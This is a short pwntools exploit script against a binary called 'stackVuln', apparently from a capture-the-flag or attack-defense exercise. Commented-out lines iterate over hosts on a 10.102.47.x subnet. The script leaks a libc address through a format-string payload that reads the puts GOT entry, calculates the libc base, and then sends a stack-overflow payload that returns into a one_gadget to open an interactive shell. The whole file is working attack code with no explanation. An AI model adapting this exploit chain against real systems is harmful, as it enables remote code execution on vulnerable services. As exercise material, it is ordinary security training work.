from pwn import *
# from LibcSearcher import *
context.log_level = 'debug'
context.arch = 'amd64'

ip_prefix = '10.102.47.'

if __name__ == '__main__':
    # for i in range(136):
    io = process('./stackVuln')
    # io = remote('10.102.47.119', 10012)
    elf = ELF('./stackVuln')
    # io = remote(ip_prefix + str(i), 9098)
    io.sendline(b'-1')
    # gdb.attach(io, 'b *0x4014a5')
    # time.sleep(3)
    puts_got = elf.got['puts']
    payload = b'%7$s0000' + p64(elf.got['puts']) + cyclic(0x100) + p64(0x404C00) + p64(0x40145B)
    io.sendline(payload)

    reply = io.recvuntil(b'output: ', drop=True)

    puts_addr = u64(io.recv()[0:6] + b'\x00\x00')
    # libc = LibcSearcher('puts', putchar_addr)
    log.info(hex(puts_addr))
    base = puts_addr - 528080
    system = puts_addr - 0x30170
    binsh = base + 1935000
    one_gadgets = [0x50a37, 0xebcf1, 0xebcf5, 0xebcf8, 0xebd52, 0xebdaf, 0xebdb3]

    io.sendline(b'-1')
    payload = cyclic(0x110) + p64(0x404800) + p64(one_gadgets[5] + base)

    io.sendline(payload)

    # print(hex(system))

    io.interactive()